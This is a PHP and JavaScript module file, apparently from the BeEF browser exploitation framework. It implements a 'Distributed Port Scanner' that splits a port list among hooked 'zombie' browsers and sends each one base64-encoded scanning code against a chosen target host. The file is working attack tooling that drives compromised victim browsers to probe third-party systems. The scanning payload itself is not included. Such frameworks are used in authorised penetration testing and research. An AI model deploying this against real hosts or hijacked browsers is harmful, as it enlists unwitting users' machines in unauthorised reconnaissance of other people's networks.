<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	session_start();
	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');

	// set results file variables
	$results_file = MODULE_TMP_DIR . md5(getcwd());
	$rand = md5(rand());
	$_SESSION[md5(getcwd())] =  $rand;
	$_SESSION[$rand] = md5(getcwd());
?>

<script>
	// show module results section
	new Element.show('module_results');
<? 
	// set javascript variables and update modules results section
	$tmp = md5(getcwd());
	echo "result_id = '" . $_SESSION[$tmp] . "';\n"; 
	echo "mod.id = '" . $_SESSION[$tmp] . "';\n"; 
	echo "mod.heartbeat();\n"; 
?>

	Element.Methods.construct_code = function() {

		var i = 0;
		var port_pos = 0;
		
		var b64code_template = '<? echo get_b64_file(JS_FILE); ?>';

		zl.selected_zombies.each( function(id){ 
			b64code = b64replace(b64code_template, "TARGET", document.myform.target_.value);
			b64code = b64replace(b64code, "TIMEOUT", document.myform.timeout.value);

			// construct/split ports
			port_str = document.myform.ports.value; 
			port_arr = port_str.split(',');

			zombie_num = zl.selected_zombies.length;
			port_num = port_arr.length;

			port_str = "";
			
			max = (port_num/zombie_num) * (i+1);

			for(var j=port_pos; j<max; j++, port_pos++) {
				if(port_str != "") port_str += ',';
				port_str += port_arr[j];
			}

			i++;

			// if ports then send port scanner code
			if(port_str != "") {
				b64code = b64replace(b64code, "PORTS", port_str);
				var params = 'data=' + b64code;
				new Ajax.Updater('module_status', 'send_cmds.php?action=cmd&result_id=' + result_id + '&zombie=' + id, {method:'post',parameters:params,asynchronous:false});
			}
		});

		if(i == 0) {
			// no zombies selected
			beef_error('No Zombie Selected. Select Zombie(s)');
		}
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<div id="module_header">Distributed Port Scanner</div>

<div class="entry">
	This module will send a subset of the ports to scan to each selected zombie browser. The 
	timeout parameter may need adjusting depending upon network latency.<br><br>

	Web browsers explictly (programmatically) prohibit connection to some ports. The results 
	of these ports are indeterminate. For a full list please refer to 
	the <a href=http://www.mozilla.org/projects/netlib/PortBanning.html>mozilla</a> page. 
</div>

<div id="module_subsection">
	<form name="myform">
		<div id="module_subsection_header">Target</div>
		<input type="text" name="target_" value="www.google.com"/>
		<div id="module_subsection_header">Port(s)</div>
		<input type="text" name="ports" value="80,220,8080"/>
		<div id="module_subsection_header">Timeout</div>
		<input type="text" name="timeout" value="1500"/>

		<input class="button" type="button" value="Scan" onClick="javascript:construct_code()"/>
	</form>
</div>	
